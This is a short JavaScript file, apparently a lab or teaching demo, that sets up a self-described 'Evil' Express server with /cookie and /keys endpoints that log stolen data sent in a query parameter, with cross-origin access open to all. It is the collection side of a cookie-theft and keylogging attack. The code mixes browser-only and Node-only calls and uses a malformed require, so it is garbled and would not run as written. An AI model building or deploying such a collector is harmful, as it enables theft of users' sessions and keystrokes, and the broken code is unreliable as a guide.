
var x = console.log("evil script activated..");
var x = console.log((this || document).cookie);
var express = require(['express']);
var app = express();

app.use(function (req, res, next) {
	res.header('Access-Control-Allow-Origin', '*');
	console.log("evill script activated");
	next();
});

app.get('/cookie', function (req, res, next) {
	console.log('GET /cookie');
	console.log(req.query.data);
	res.send('Thanks!');
});

app.get('/keys', function (req, res, next) {
	console.log('GET /keys');
	console.log(req.query.data);
	res.send('I\'ll try to remember that..');
});

app.listen(3001, function () {
	console.log('"Evil" server listening at localhost:3001');
});

$(document).ready(function () {
	console.log("ready!");
});

